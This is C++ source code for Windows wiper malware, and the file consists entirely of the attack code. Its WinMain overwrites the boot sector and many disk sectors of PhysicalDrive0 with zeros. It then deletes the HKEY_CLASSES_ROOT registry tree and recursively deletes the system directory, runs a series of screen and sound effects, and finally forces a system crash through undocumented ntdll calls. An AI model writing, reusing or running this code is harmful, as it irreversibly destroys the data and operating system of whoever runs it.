#include "payloads.h"
bool RemoveDir(const char* szFileDir){
string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
	strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
	return false;
	do {
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (stricmp(wfd.cFileName,".") != 0 && stricmp(wfd.cFileName,"..") != 0)
				RemoveDir((strDir + wfd.cFileName).c_str());
			} else {
				DeleteFile((strDir + wfd.cFileName).c_str());
			}
	}
while (FindNextFile(hFind,&wfd));
	FindClose(hFind);
RemoveDirectory(szFileDir);
return true;
}
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	DWORD wb;
	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 512);
	SetFilePointer(drive, 0, NULL, FILE_BEGIN);
	for(int i = 0;i < 50000;i++){
		WriteFile(drive, bootcode, 512, &wb, NULL);
		SetFilePointer(drive, 512, NULL, FILE_CURRENT);
	}
	CloseHandle(drive);
	SHDeleteKey(HKEY_CLASSES_ROOT, NULL);
	char SystemPath[MAX_PATH];
	GetSystemDirectory(SystemPath, sizeof(SystemPath));
	RemoveDir(SystemPath);
	rt(Sound);
	rt(_MSG);
	Sleep(5000);
	rt(MoveDesk)
	Sleep(10000);
	rt(wave);
	rt(CopyCur);
	Sleep(10000);
	rt(DrawError);
	Sleep(10000);
	rt(Stretch);
	rt(Click);
	Sleep(20000);
	rt(_Ellipse);
	rt(triangle);
	Sleep(1000);
	rt(gray)
	Sleep(20000);
	rt(Tunnel);
	Sleep(20000);
	rt(MoveDesk);
	Sleep(5000);
	rt(pat);
	Sleep(10000);
	rt(MSGBX);
	Sleep(25000);
	rt(Square);
	Sleep(10000);
	HMODULE ntdll = LoadLibrary("ntdll.dll");
 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
 	unsigned char ErrKill;
 	long unsigned int HDErr;
 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xdead6666,0,0,0,6, &HDErr);
}